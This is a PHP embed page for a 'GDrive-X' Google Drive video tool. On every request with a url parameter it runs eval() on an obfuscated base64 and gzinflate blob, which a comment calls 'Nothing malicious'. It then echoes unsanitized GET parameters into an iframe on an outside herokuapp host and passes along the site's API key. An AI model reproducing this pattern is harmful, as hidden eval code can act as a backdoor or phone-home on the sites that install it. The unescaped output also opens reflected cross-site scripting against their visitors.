<?php
error_reporting(0);
include "crypt.php";
require_once 'config.php';
$domain_server = $base_url;

if($_GET['url'] != ""){
	$url = $_GET['url'];
	$sub = $_GET['sub'];
	$poster = $_GET['poster'];
        $title = $_GET["title"];

	/* Nothing malicious. It is encoded to protect GDrive-X Tool */
	function VIt($iCk) { 
		$iCk=gzinflate(base64_decode($iCk));
		for($i=0;$i<strlen($iCk);$i++) {
			$iCk[$i] = chr(ord($iCk[$i])-1);
		} return $iCk;
	} eval(VIt("U1QEAW7V1IK8pKz8hPK04qz0KkU7Rc2skpK0Uk3VhBC34HC34BgNz9DQwBCNOC1FB0XlzNLSwhJlRWsYS0tRX1HZ2sAArhqkOMEzICQ0TtmGWzU5oaw4F2hmXlVCSVZeYW5aQkpxVSHQcBRLtYAqSxKSCrOwqQQKA+Ud7AE="));
}
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Google Photos - GDrive-X Premium Free Tool</title>
<link rel="icon" href="<?php echo $domain_server?>/assets/favicon.ico">	
<style>body,html {background-color: #000;margin:0px;padding:0;width:100%;height:100%;border:none;}</style>
</head>
<body>
<iframe src="https://gdxpapifree.herokuapp.com/embed_free.php?url=<?php echo $url;?>&poster=<?php echo $poster;?>&sub=<?php echo $sub;?>&title=<?php echo $title;?>&api=<?php echo $s_api;?>&req=<?php echo $b_url;?>" width="100%" height="100%" frameborder="0" scrolling="no" allowfullscreen></iframe>
<script src='secure.js'></script>
</body>
</html>
